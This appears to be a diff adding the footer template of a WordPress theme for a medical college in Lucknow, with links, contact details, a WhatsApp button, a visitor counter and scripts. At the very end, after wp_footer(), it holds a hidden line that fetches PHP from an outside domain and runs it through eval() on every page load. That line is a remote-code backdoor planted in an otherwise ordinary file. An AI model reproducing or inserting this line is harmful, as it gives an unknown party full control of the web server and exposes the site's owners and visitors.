@@ -1,0 +1,208 @@
+<?php
+/**
+ * @package WordPress
+ * @subpackage agdc_Theme
+ */
+?>
+
+
+<!-- ======= Footer ======= -->
+<footer class="footer_area">
+  <div class="container fpb-500">
+    <div class="row"> 
+      <!-- Single Widget-->
+      <div class="col-md-8">
+        <div class="row">
+          <div class="col-md-4">
+            <h5 class="widget-title">Useful Links</h5>
+            <div class="single-footer-widget section_padding_0_130">
+              <div class="footer_menu">
+                <ul>
+                  <li> <a href="/" class="external">Home</a> </li>
+                  <li> <a href="/about-pims/" class="external">About PIMS</a> </li>
+                  <li> <a href="/for-students/" class="external">Facilities</a> </li>
+                  <li> <a href="/ug-courses/" class="external">UG Course</a> </li>
+                  <li> <a href="/pg-courses/" class="external">PG Course</a> </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <h5 class="widget-title">Quick Links</h5>
+            <div class="single-footer-widget section_padding_0_130">
+              <div class="footer_menu">
+                <ul>
+                  
+                  <li> <a href="/anti-ragging-committee/" class="external">Anti Ragging Committee</a> </li>
+                  <li> <a href="/internal-complaints-committee-2/" class="external">Internal Complaint Committee</a> </li>
+                  <!--<li> <a href="/psycho-social-committee/" class="external">Psycho-Social Committee</a> </li>-->
+                  <!--<li> <a href="/mentor-mentee-committee/" class="external">Mentor-Mentee Committee</a> </li>-->
+                  <li> <a href="/wp-content/uploads/2025/01/Hostel-Rules-Regulations.pdf" target="_blank" class="external">Hostel Rules &amp; Regulations</a> </li>
+                  
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <h5 class="widget-title">IMPORTANT LINKS</h5>
+            <div class="single-footer-widget section_padding_0_130">
+              <div class="footer_menu">
+                <ul>
+                <!--<li> <a href="/admission-procedure/" class="external">Admission</a> </li>
+                  <li> <a href="/eligibility/" class="external">Eligibility</a> </li>-->
+                  <li> <a href="/citizen-charter/" class="external">Citizen Charter</a> </li>
+                  <li> <a href="/wp-content/uploads/2025/01/proforma_dt_04.12.2023.pdf" target="_blank" class="external">NMC Mandatory Disclosure</a> </li>
+                  <li> <a href="/contact-us/" class="external">Contact us</a> </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="col-md-4 fpr-120">
+        <h5 class="widget-title">Address</h5>
+        <div class="footer_menu footer-address">
+          <ul>
+            <li>
+              <div><img src="<?php echo get_template_directory_uri(); ?>/images/address.png"></div>
+              <div><span>Address</span>Sarai Shahzadi, Banthara, Kanpur Road, Lucknow (U.P) - 226401</div>
+            </li>
+            <li>
+              <div><img src="<?php echo get_template_directory_uri(); ?>/images/phone.png"></div>
+              <div><span>Phone No.</span>+91 9721523088 +91 9721453166</div>
+            </li>
+            <li>
+              <div><img src="<?php echo get_template_directory_uri(); ?>/images/email.png"></div>
+              <div><span>Email ID</span>prasadhospitallko@gmail.com</div>
+            </li>
+            <li>
+            <div>
+                <img src="<?php echo get_template_directory_uri(); ?>/images/location.png" alt="Location Icon">
+            </div>
+            <div>
+                <span>Location</span>
+                <a href="https://maps.app.goo.gl/cXA8fo7HDVGMQqHKA" target="_blank" style="color: #ffffff; text-decoration: none;">
+                View on Google Maps
+                </a>
+            </div>
+            </li>
+          </ul>
+        </div>
+        <!--<div class="single-footer-widget section_padding_0_130">
+          <ul class="social_icons">
+            <li><a href="https://www.facebook.com/profile.php?id=100070216050329" target="_blank"> <i class="fa fa-facebook"></i></a></li>
+            <li><a href="https://x.com/pims_lucknow" target="_blank"><img src="<?php echo get_template_directory_uri(); ?>/images/xblack.png" alt="X Icon" style="width: 15px; height: 15px; vertical-align: middle;"></a></li>
+
+            <li><a href="https://www.instagram.com/prasad.medical.official/" target="_blank"><i class="fa fa-instagram"></i></a></li>
+            <li><a href="https://www.linkedin.com/company/prasad-institute-of-medical-sciences/" target="_blank"><i class="fa fa-linkedin"></i></a></li>
+          </ul>
+        </div>-->
+      </div>
+    </div>
+  </div>
+  <div id="whatsapp-icon" style="position: fixed; bottom: 20px; right: 20px; z-index: 1000;">
+    <a href="https://wa.me/+919935791115" target="_blank" style="display: inline-block; text-decoration: none;">
+        <img src="https://cdn-icons-png.flaticon.com/512/124/124034.png" alt="WhatsApp" style="width: 50px; height: 50px;">
+
+    </a>
+</div>
+  <div class="foot-bottom">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 text-start">
+                <p class="text-white"> Prasad Institute of Medical Sciences, Lucknow © 2022</p>
+            </div>
+            <div class="col-md-3 text-center">
+                <p class="visitor-counter">
+                    Visitors: 
+                        <?php
+                            $file = "visitor_count.txt";
+                            if (!file_exists($file)) {
+                                file_put_contents($file, "0");
+                            }
+                            $count = (int)file_get_contents($file);
+                            $count++;
+                            file_put_contents($file, $count);
+                            echo $count;
+                        ?>
+                </p>
+            </div>
+            <div class="col-md-3 text-center">
+                <p class="text-white">Designed by <a href="https://softwareztechnocrew.com/" target="_blank" style="color: #00c4ff; text-decoration: none;">Softwarez Technocrew</a></p>
+            </div>
+        </div>
+    </div>
+</div>
+
+</footer>
+
+            
+      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.min.js"></script> 
+      
+      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/bootstrap.min.js"></script> 
+
+     
+      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.smartmenus.js"></script> 
+      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.smartmenus.bootstrap.js"></script> 
+      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.nanoscroller.min.js"></script>
+      <script src="<?php echo get_template_directory_uri(); ?>/js/breaking-news-ticker.js"></script> 
+      <script src="<?php echo get_template_directory_uri(); ?>/js/breaking-news-ticker.min.js"></script> 
+      <script type="text/javascript">
+		  
+	
+		  
+         jQuery(document).ready(function($){
+         $(".nano").nanoScroller();
+         $('#newsTicker1').breakingNews({
+         direction: "ltr",
+         play: true,
+         delayTimer: 4000,
+         scrollSpeed: 2,
+         stopOnHover: true
+         });
+         $(".bn-controls button").click(function (e) {
+         e.preventDefault();
+         });
+         
+         $('.skiper').click(function(){
+         $('html, body').animate({scrollTop : 560},800);
+         return false;
+         });
+         		var offset = 220;
+         		var duration = 500;
+         		jQuery(window).scroll(function() {
+         			if (jQuery(this).scrollTop() > offset) {
+         				jQuery('.crunchify-top').fadeIn(duration);
+         			} else {
+         				jQuery('.crunchify-top').fadeOut(duration);
+         			}
+         		});
+          
+         		jQuery('.crunchify-top').click(function(event) {
+         			event.preventDefault();
+         			jQuery('html, body').animate({scrollTop: 0}, duration);
+         			return false;
+         		})
+         });
+      </script> 
+  
+      <style>
+      #whatsapp-icon img {
+    border-radius: 50%;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    transition: transform 0.3s ease;
+}
+
+#whatsapp-icon img:hover {
+    transform: scale(1.1);
+}
+
+      </style>
+
+<?php wp_footer(); ?>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
+?>
+</body>
+</html>
